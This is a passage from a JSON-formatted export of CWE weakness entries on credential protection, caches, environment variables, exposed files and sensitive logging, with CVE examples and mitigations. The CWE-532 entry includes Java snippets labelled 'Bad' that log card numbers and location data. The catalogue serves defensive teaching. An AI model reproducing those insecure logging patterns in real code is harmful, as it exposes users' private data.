"Kyocera multifunction printers running vulnerable versions of Net View unintentionally expose sensitive user information, including usernames and passwords, through an insufficiently protected address book export function."}, {"Reference": "CVE-2022-2221", "Description": "Information Exposure vulnerability in My Account Settings of Devolutions Remote Desktop Manager before 2022.1.8 allows authenticated users to access credentials of other users. This issue affects: Devolutions Remote Desktop Manager versions prior to 2022.1.8."}, {"Reference": "CVE-2022-22998", "Description": "Implemented protections on AWS credentials that were not properly protected."}, {"Reference": "CVE-2022-23223", "Description": "On Apache ShenYu versions 2.4.0 and 2.4.1, and endpoint existed that disclosed the passwords of all users. Users are recommended to upgrade to version 2.4.2 or later."}, {"Reference": "CVE-2022-24978", "Description": "Zoho ManageEngine ADAudit Plus before 7055 allows authenticated Privilege Escalation on Integrated products. This occurs because a password field is present in a JSON response."}, {"Reference": "CVE-2022-26341", "Description": "Insufficiently protected credentials in software in Intel(R) AMT SDK before version 16.0.4.1, Intel(R) EMA before version 1.7.1 and Intel(R) MC before version 2.3.2 may allow an authenticated user to potentially enable escalation of privilege via network access."}, {"Reference": "CVE-2022-26844", "Description": "Insufficiently protected credentials in the installation binaries for Intel(R) SEAPI in all versions may allow an authenticated user to potentially enable escalation of privilege via local access."}, {"Reference": "CVE-2022-26948", "Description": "The Archer RSS feed integration for Archer 6.x through 6.9 SP1 (6.9.1.0) is affected by an insecure credential storage vulnerability. A malicious attacker may obtain access to credential information to use it in further attacks."}, {"Reference": "CVE-2022-27179", "Description": "A malicious actor having access to the exported configuration file may obtain the stored credentials and thereby gain access to the protected resource. If the same passwords were used for other resources, further such assets may be compromised."}, {"Reference": "CVE-2022-27560", "Description": "HCL VersionVault Express exposes administrator credentials."}, {"Reference": "CVE-2022-27774", "Description": "An insufficiently protected credentials vulnerability exists in curl 4.9 to and include curl 7.82.0 are affected that could allow an attacker to extract credentials when follows HTTP(S) redirects is used with authentication could leak credentials to other services that exist on different protocols or port numbers."}, {"Reference": "CVE-2022-29089", "Description": "Dell Networking OS10, versions prior to October 2021 with Smart Fabric Services enabled, contains an information disclosure vulnerability. A remote, unauthenticated attacker could potentially exploit this vulnerability by reverse engineering to retrieve sensitive information and access the REST API with admin privileges."}, {"Reference": "CVE-2022-29507", "Description": "Insufficiently protected credentials in the Intel(R) Team Blue mobile application in all versions may allow an authenticated user to potentially enable information disclosure via local access."}, {"Reference": "CVE-2022-2967", "Description": "Prosys OPC UA Simulation Server version prior to v5.3.0-64 and UA Modbus Server versions 1.4.18-5 and prior do not sufficiently protect credentials, which could allow an attacker to obtain user credentials and gain access to system data."}, {"Reference": "CVE-2022-29833", "Description": "Insufficiently Protected Credentials vulnerability in Mitsubishi Electric Corporation GX Works3 versions 1.015R and later allows a remote unauthenticated attacker to disclose sensitive information. As a result, unauthenticated users could access to MELSEC safety CPU modules illgally."}, {"Reference": "CVE-2022-29839", "Description": "Insufficiently Protected Credentials vulnerability in the remote backups application on Western Digital My Cloud devices that could allow an attacker who has gained access to a relevant endpoint to use that information to access protected data. This issue affects: Western Digital My Cloud My Cloud versions prior to 5.25.124 on Linux."}, {"Reference": "CVE-2022-30296", "Description": "Insufficiently protected credentials in the Intel(R) Datacenter Group Event iOS application, all versions, may allow an unauthenticated user to potentially enable information disclosure via network access."}, {"Reference": "CVE-2022-30601", "Description": "Insufficiently protected credentials for Intel(R) AMT and Intel(R) Standard Manageability may allow an unauthenticated user to potentially enable information disclosure and escalation of privilege via network access."}, {"Reference": "CVE-2022-23725", "Description": "PingID Windows Login prior to 2.8 does not properly set permissions on the Windows Registry entries used to store sensitive API keys under some circumstances."}, {"Reference": "CVE-2022-31205", "Description": "In Omron CS series, CJ series, and CP series PLCs through 2022-05-18, the password for access to the Web UI is stored in memory area D1449...D1452 and can be read out using the Omron FINS protocol without any further authentication."}, {"Reference": "CVE-2022-42132", "Description": "The Test LDAP Users functionality in Liferay Portal 7.0.0 through 7.4.3.4, and Liferay DXP 7.0 fix pack 102 and earlier, 7.1 before fix pack 27, 7.2 before fix pack 17, 7.3 before update 4, and DXP 7.4 GA includes the LDAP credential in the page URL when paginating through the list of users, which allows man-in-the-middle attackers or attackers with access to the request logs to see the LDAP credential."}, {"Reference": "CVE-2022-43959", "Description": "Insufficiently Protected Credentials in the AD/LDAP server settings in 1C-Bitrix Bitrix24 through 22.200.200 allow remote administrators to discover an AD/LDAP administrative password by reading the source code of /bitrix/admin/ldap_server_edit.php."}, {"Reference": "CVE-2022-46155", "Description": "Airtable.js is the JavaScript client for Airtable. Prior to version 0.11.6, Airtable.js had a misconfigured build script in its source package. When the build script is run, it would bundle environment variables into the build target of a transpiled bundle. Specifically, the AIRTABLE_API_KEY and AIRTABLE_ENDPOINT_URL environment variables are inserted during Browserify builds due to being referenced in Airtable.js code. This only affects copies of Airtable.js built from its source, not those installed via npm or yarn. Airtable API keys set in users\u2019 environments via the AIRTABLE_API_KEY environment variable may be bundled into local copies of Airtable.js source code if all of the following conditions are met: 1) the user has cloned the Airtable.js source onto their machine, 2) the user runs the `npm prepare` script, and 3) the user' has the AIRTABLE_API_KEY environment variable set. If these conditions are met, a user\u2019s local build of Airtable.js would be modified to include the value of the AIRTABLE_API_KEY environment variable, which could then be accidentally shipped in the bundled code. Users who do not meet all three of these conditions are not impacted by this issue. Users should upgrade to Airtable.js version 0.11.6 or higher; or, as a workaround unset the AIRTABLE_API_KEY environment variable in their shell and/or remove it from your .bashrc, .zshrc, or other shell configuration files. Users should also regenerate any Airtable API keys they use, as the keysy may be present in bundled code."}, {"Reference": "CVE-2022-30586", "Description": "Gradle Enterprise through 2022.2.2 has Incorrect Access Control that leads to code execution."}, {"Reference": "CVE-2022-30587", "Description": "Gradle Enterprise through 2022.2.2 has Incorrect Access Control that leads to information disclosure."}, {"Reference": "CVE-2022-30237", "Description": "A CWE-311: Missing Encryption of Sensitive Data vulnerability exists that could allow authentication credentials to be recovered when an attacker breaks the encoding. Affected Products: Wiser Smart, EER21000 & EER21001 (V4.5 and prior)"}, {"Reference": "CVE-2022-29959", "Description": "Emerson OpenBSI through 2022-04-29 mishandles credential storage. It is an engineering environment for the ControlWave and Bristol Babcock line of RTUs. This environment provides access control functionality through user authentication and privilege management. The credentials for various users are stored insecurely in the SecUsers.ini file by using a simple string transformation rather than a cryptographic mechanism."}, {"Reference": "CVE-2022-27192", "Description": "The Reporting module in Aseco Lietuva document management system DVS Avilys before 3.5.58 allows unauthorized file download. An unauthenticated attacker can impersonate an administrator by reading administrative files."}, {"Reference": "CVE-2022-27630", "Description": "An information disclosure vulnerability exists in the confctl_get_master_wlan functionality of TCL LinkHub Mesh Wi-Fi MS1G_00_01.00_14. A specially-crafted network packet can lead to information disclosure. An attacker can send packets to trigger this vulnerability."}, {"Reference": "CVE-2022-27633", "Description": "An information disclosure vulnerability exists in the confctl_get_guest_wlan functionality of TCL LinkHub Mesh Wifi MS1G_00_01.00_14. A specially-crafted network packet can lead to information disclosure. An attacker can send packets to trigger this vulnerability."}]}
{"ID": "523", "Name": "Unprotected Transport of Credentials", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "522", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanAlsoBe", "CweID": "312", "ViewID": "1000"}], "BackgroundDetails": ["SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents."], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Operation", "System Configuration"], "Description": "Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier."}], "RelatedAttackPatterns": ["102"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-20826", "Description": "Unprotected transport of credentials vulnerability in IDEC PLCs (FC6A Series MICROSmart All-in-One CPU module v2.32 and earlier, FC6A Series MICROSmart Plus CPU module v1.91 and earlier, WindLDR v8.19.1 and earlier, WindEDIT Lite v1.3.1 and earlier, and Data File Manager v2.12.1 and earlier) allows an attacker to obtain the PLC Web server user credentials from the communication between the PLC and the software. As a result, the complete access privileges to the PLC Web server may be obtained, and manipulation of the PLC output and/or suspension of the PLC may be conducted."}, {"Reference": "CVE-2022-34371", "Description": "Dell PowerScale OneFS, versions 9.0.0 up to and including 9.1.0.19, 9.2.1.12, 9.3.0.6, and 9.4.0.3, contain an unprotected transport of credentials vulnerability. A malicious unprivileged network attacker could potentially exploit this vulnerability, leading to full system compromise."}]}
{"ID": "524", "Name": "Use of Cache Containing Sensitive Information", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.", "ExtendedDescription": "Applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations. A cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources. If the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Protect information stored in cache."}, {"Phase": ["Architecture and Design"], "Description": "Do not store unnecessarily sensitive information in the cache."}, {"Phase": ["Architecture and Design"], "Description": "Consider using encryption in the cache."}], "RelatedAttackPatterns": ["204"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-44854", "Description": "An issue was discovered in MediaWiki before 1.35.5, 1.36.x before 1.36.3, and 1.37.x before 1.37.1. The REST API publicly caches results from private wikis."}, {"Reference": "CVE-2022-23498", "Description": "Grafana is an open-source platform for monitoring and observability. When datasource query caching is enabled, Grafana caches all headers, including `grafana_session`. As a result, any user that queries a datasource where the caching is enabled can acquire another user\u2019s session. To mitigate the vulnerability you can disable datasource query caching for all datasources. This issue has been patched in versions 9.2.10 and 9.3.4. "}]}
{"ID": "525", "Name": "Use of Web Browser Cache Containing Sensitive Information", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "524", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Browsers often store information in a client-side cache, which can leave behind sensitive information for other users to find and exploit, such as passwords or credit card numbers. The locations at most risk include public terminals, such as those in libraries and Internet cafes."}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Protect information stored in cache."}, {"Phase": ["Architecture and Design", "Implementation"], "Description": "Use a restrictive caching policy for forms and web pages that potentially contain sensitive information."}, {"Phase": ["Architecture and Design"], "Description": "Do not store unnecessarily sensitive information in the cache."}, {"Phase": ["Architecture and Design"], "Description": "Consider using encryption in the cache."}], "RelatedAttackPatterns": ["37"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-24742", "Description": "Sylius is an open source eCommerce platform. Prior to versions 1.9.10, 1.10.11, and 1.11.2, any other user can view the data if browser tab remains unclosed after log out. The issue is fixed in versions 1.9.10, 1.10.11, and 1.11.2. A workaround is available. The application must strictly redirect to login page even browser back button is pressed. Another possibility is to set more strict cache policies for restricted content."}, {"Reference": "CVE-2022-24747", "Description": "Shopware is an open commerce platform based on the Symfony php Framework and the Vue javascript framework. Affected versions of shopware do no properly set sensitive HTTP headers to be non-cacheable. If there is an HTTP cache between the server and client then headers may be exposed via HTTP caches. This issue has been resolved in version 6.4.8.2. There are no known workarounds."}]}
{"ID": "526", "Name": "Cleartext Storage of Sensitive Information in an Environment Variable", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses an environment variable to store unencrypted sensitive information.", "ExtendedDescription": "Information stored in an environment variable can be accessible by other processes with the execution context, including child processes that dependencies are executed in, or serverless functions in cloud environments. An environment variable's contents can also be inserted into messages, headers, log files, or other outputs. Often these other dependencies have no need to use the environment variable in question. A weakness that discloses environment variables could expose this information.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "312", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "214", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Encrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such as CWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption."}, {"Phase": ["Implementation"], "Description": "If the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value."}], "ObservedExamples": [{"Reference": "CVE-2022-43691", "Description": "CMS shows sensitive server-side information from environment variables when run in Debug mode.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-43691"}, {"Reference": "CVE-2022-27195", "Description": "Plugin for an automation server inserts environment variable contents into build XML files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-27195"}, {"Reference": "CVE-2022-25264", "Description": "CI/CD tool logs environment variables related to passwords add Contribution to content history.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-25264"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-46155", "Description": "Airtable.js is the JavaScript client for Airtable. Prior to version 0.11.6, Airtable.js had a misconfigured build script in its source package. When the build script is run, it would bundle environment variables into the build target of a transpiled bundle. Specifically, the AIRTABLE_API_KEY and AIRTABLE_ENDPOINT_URL environment variables are inserted during Browserify builds due to being referenced in Airtable.js code. This only affects copies of Airtable.js built from its source, not those installed via npm or yarn. Airtable API keys set in users\u2019 environments via the AIRTABLE_API_KEY environment variable may be bundled into local copies of Airtable.js source code if all of the following conditions are met: 1) the user has cloned the Airtable.js source onto their machine, 2) the user runs the `npm prepare` script, and 3) the user' has the AIRTABLE_API_KEY environment variable set. If these conditions are met, a user\u2019s local build of Airtable.js would be modified to include the value of the AIRTABLE_API_KEY environment variable, which could then be accidentally shipped in the bundled code. Users who do not meet all three of these conditions are not impacted by this issue. Users should upgrade to Airtable.js version 0.11.6 or higher; or, as a workaround unset the AIRTABLE_API_KEY environment variable in their shell and/or remove it from your .bashrc, .zshrc, or other shell configuration files. Users should also regenerate any Airtable API keys they use, as the keysy may be present in bundled code."}, {"Reference": "CVE-2022-2739", "Description": "The version of podman as released for Red Hat Enterprise Linux 7 Extras via RHSA-2022:2190 advisory included an incorrect version of podman missing the fix for CVE-2020-14370, which was previously fixed via RHSA-2020:5056. This issue could possibly allow an attacker to gain access to sensitive information stored in environment variables."}]}
{"ID": "527", "Name": "Exposure of Version-Control Repository to an Unauthorized Control Sphere", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product stores a CVS, git, or other repository in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.", "ExtendedDescription": "Version control repositories such as CVS or git store version-specific metadata and other details within subdirectories. If these subdirectories are stored on a web server or added to an archive, then these could be used by an attacker. This information may include usernames, filenames, path root, IP addresses, and detailed \"diff\" data about how files have been changed - which could reveal source code snippets that were never intended to be made public.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"]}], "PotentialMitigations": [{"Phase": ["Operation", "Distribution", "System Configuration"], "Description": "Recommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "528", "Name": "Exposure of Core Dump File to an Unauthorized Control Sphere", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product generates a core dump file in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["System Configuration"], "Description": "Protect the core dump files from unauthorized access."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "529", "Name": "Exposure of Access Control List Files to an Unauthorized Control Sphere", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.", "ExtendedDescription": "Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Access Control"], "Impact": ["Read Application Data", "Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["System Configuration"], "Description": "Protect access control list files."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "53", "Name": "Path Equivalence: '\\multiple\\\\internal\\backslash'", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of multiple internal backslash ('\\multiple\\trailing\\\\slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "165", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "530", "Name": "Exposure of Backup File to an Unauthorized Control Sphere", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "A backup file is stored in a directory or archive that is made accessible to unauthorized actors.", "ExtendedDescription": "Often, older backup files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Operation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "At a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Policy"], "Description": "Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "531", "Name": "Inclusion of Sensitive Information in Test Code", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "540", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Testing"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Distribution", "Installation"], "Description": "Remove test code before deploying the application into production."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Examples of common issues with test applications include administrative functions, listings of usernames, passwords or session identifiers and information about the system, server or application configuration."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "532", "Name": "Insertion of Sensitive Information into Log File", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.", "ExtendedDescription": "\n\nWhile logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.\n\n\nDifferent log files may be produced and stored for:\n\n\n  - Server log files (e.g. server.log). This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.\n\n  - log files that are used for debugging\n\n", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "538", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "200", "ViewID": "1003", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."}, {"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Implementation"], "Description": "Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files."}, {"Phase": ["Distribution"], "Description": "Remove debug log files before deploying the application into production."}, {"Phase": ["Operation"], "Description": "Protect log files against unauthorized read/write."}, {"Phase": ["Implementation"], "Description": "Adjust configurations appropriately when software is transitioned from a debug state to production."}], "DemonstrativeExamples": [{"ID": "DX-179", "Entries": [{"IntroText": "In the following code snippet, a user's full name and credit card number are written to a log file."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tlogger.info(\"Username: \" + usernme + \", CCN: \" + ccn);\n```"}]}, {"ID": "DX-120", "Entries": [{"IntroText": "This code stores location information about the current user:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tlocationClient = new LocationClient(this, this, this);\n\tlocationClient.connect();\n\tcurrentUser.setLocation(locationClient.getLastLocation());\n```\n...* \n\t\n\tcatch (Exception e) {\n\t```\n\t\tAlertDialog.Builder builder = new AlertDialog.Builder(this);\n\t\tbuilder.setMessage(\"Sorry, this application has experienced an error.\");\n\t\tAlertDialog alert = builder.create();\n\t\talert.show();\n\t\tLog.e(\"ExampleActivity\", \"Caught exception: \" + e + \" While on User:\" + User.toString());\n\t}\n```"}, {"BodyText": "When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log."}]}, {"ID": "DX-119", "Entries": [{"IntroText": "In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file."}, 